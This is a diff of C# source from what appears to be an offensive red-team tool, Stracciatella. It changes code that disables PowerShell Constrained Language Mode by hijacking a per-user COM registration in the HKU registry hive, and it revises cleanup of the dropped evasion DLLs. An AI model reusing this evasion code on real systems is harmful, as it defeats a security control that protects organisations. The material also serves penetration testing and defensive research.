@@ -56,15 +56,15 @@ namespace Stracciatella
                 $key = 'HKU:\{0}_classes\{1}\CLSID' -f $sid, """ + COM_NAME + @""";
                 New-ItemProperty -Force -Path $key -Name '(Default)' -Value """ + COM_GUID + @""" -PropertyType String;
 ";
-            string deregisterCOM = $@"
+            string deregisterCOM = @"
                 $sid = (whoami /user | select-string -Pattern ""(S-1-5[0-9-]+)"" -all | select -ExpandProperty Matches).value;
 
-                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS | Out-Null;
+                New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS;
                 $key = 'HKU:\{0}_classes\{1}' -f $sid, """ + COM_NAME + @""";
-                Remove-Item -Force -Path $key -Recurse | Out-Null;
+                Remove-Item -Force -Path $key -Recurse;
 
                 $key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, """ + COM_GUID + @""";
-                Remove-Item -Force -Path $key -Recurse | Out-Null;
+                Remove-Item -Force -Path $key -Recurse;
 ";
             if (deregister)
             {
@@ -104,7 +104,7 @@ namespace Stracciatella
             }
 
             if (DisableClm.Verbose) Console.WriteLine("[.] Step 2. Invoking it...");
-            if (DisableClm.Verbose) Stracciatella.ExecuteCommand($"New-Object -ComObject {COM_NAME}", rs, host, true, false, false);
+            if (DisableClm.Verbose) Stracciatella.ExecuteCommand($"New-Object -ComObject {COM_NAME}", rs, host, true, true, false);
 
             System.Threading.Thread.Sleep(1000);
 
@@ -161,13 +161,30 @@ namespace Stracciatella
 
         public static bool Cleanup(PowerShell rs, CustomPSHost host, bool verb)
         {
-            if (verb) Console.WriteLine("[.] Cleaning up CLM disable artefacts...");
-            bool ret = CreateCOM(rs, host, true);
+            if(rs != null && host != null) {
+                if (verb) Console.WriteLine("\n[.] Cleaning up CLM disable artefacts...");
+                CreateCOM(rs, host, true);
+            }
 
-            File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
-            File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
+            try
+            {
+                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
+                File.Delete(Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
+            }
+            catch (Exception e)
+            {
+                if (rs != null && host != null)
+                {
+                    if (verb)
+                    {
+                        Console.WriteLine("[!] Could not remove CLM evasion DLL files as they were in-use. You'll need to remove them by hand:\n");
+                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEASSEMBLY_PATH));
+                        Console.WriteLine("\tPS> Remove-Item " + Environment.ExpandEnvironmentVariables(OUTPUT_CLMDISABLEDLL_PATH));
+                    }
+                }
+            }
 
-            return ret;
+            return true;
         }
     }
 }
